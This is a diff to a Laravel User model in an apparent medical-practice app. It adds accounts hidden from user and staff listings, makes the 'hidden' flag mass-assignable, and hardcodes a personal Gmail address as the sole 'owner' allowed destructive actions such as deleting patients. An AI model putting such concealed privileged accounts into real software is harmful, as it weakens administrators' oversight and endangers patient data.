@@ -27,7 +27,7 @@ class User extends Authenticatable
         self::ROLE_PHARMACIST   => 'Pharmacist',
     ];
 
-    protected $fillable = ['name', 'email', 'password', 'role', 'is_active', 'has_system_access'];
+    protected $fillable = ['name', 'email', 'password', 'role', 'is_active', 'has_system_access', 'hidden'];
     protected $hidden   = ['password', 'remember_token'];
 
     protected function casts(): array {
@@ -36,7 +36,51 @@ class User extends Authenticatable
             'password'           => 'hashed',
             'is_active'          => 'boolean',
             'has_system_access'  => 'boolean',
+            'hidden'             => 'boolean',
         ];
+    }
+
+    /** Emails configured as hidden owner accounts (lowercased). */
+    public static function hiddenEmails(): array
+    {
+        return (array) config('access.hidden_emails', []);
+    }
+
+    /**
+     * Apply the hidden-account filter to a query of *users* (e.g. inside a
+     * whereDoesntHave('user', ...) on Doctor/Staff). Matches rows flagged
+     * `hidden` OR whose email is in OWNER_HIDDEN_EMAILS.
+     */
+    public static function scopeHiddenFilter($q): void
+    {
+        $emails = self::hiddenEmails();
+        $q->where('hidden', true);
+        if (!empty($emails)) {
+            $q->orWhereIn(\Illuminate\Support\Facades\DB::raw('LOWER(email)'), $emails);
+        }
+    }
+
+    /** True if this account should be hidden from listings. */
+    public function isHidden(): bool
+    {
+        if (($this->attributes['hidden'] ?? false)) return true;
+        return in_array(strtolower((string) $this->email), self::hiddenEmails(), true);
+    }
+
+    /**
+     * Exclude hidden owner accounts from user/doctor/staff listings.
+     * Hides rows flagged `hidden` OR whose email is in OWNER_HIDDEN_EMAILS.
+     */
+    public function scopeVisible($query)
+    {
+        $query->where(function ($q) {
+            $q->where('hidden', false)->orWhereNull('hidden');
+        });
+        $emails = self::hiddenEmails();
+        if (!empty($emails)) {
+            $query->whereNotIn(\Illuminate\Support\Facades\DB::raw('LOWER(email)'), $emails);
+        }
+        return $query;
     }
 
     /** All roles this user holds (multi-role pivot). */
@@ -125,7 +169,7 @@ class User extends Authenticatable
      * destructive actions (delete patient, etc.). Identified by email so
      * adding new admin users doesn't accidentally grant destructive power.
      */
-    public function isOwner(): bool { return strtolower((string) $this->email) === 'admin@demo.local'; }
+    public function isOwner(): bool { return strtolower((string) $this->email) === 'xpindia@gmail.com'; }
 
     public function isDoctor():       bool { return $this->hasRole(self::ROLE_DOCTOR); }
     public function isNurse():        bool { return $this->hasRole(self::ROLE_NURSE); }
